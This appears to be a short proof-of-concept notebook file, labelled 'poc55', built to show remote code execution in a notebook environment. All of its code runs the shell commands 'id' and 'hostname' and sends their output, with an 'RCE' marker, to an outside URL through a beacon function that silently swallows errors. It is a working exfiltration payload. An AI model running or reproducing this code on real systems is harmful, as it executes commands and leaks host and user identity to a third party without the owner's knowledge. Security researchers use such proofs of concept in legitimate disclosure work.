# %%
import urllib.request, os, json
def _b(t, v=""):
  try: urllib.request.urlopen("https://colab.research.google.com/__poc55_rce/"+t+"?d="+urllib.request.quote(str(v)[:500]))
  except: pass
_b("CELL_RCE")
_b("ID", os.popen("id").read())
_b("HOST", os.popen("hostname").read())

# %%
# poc55
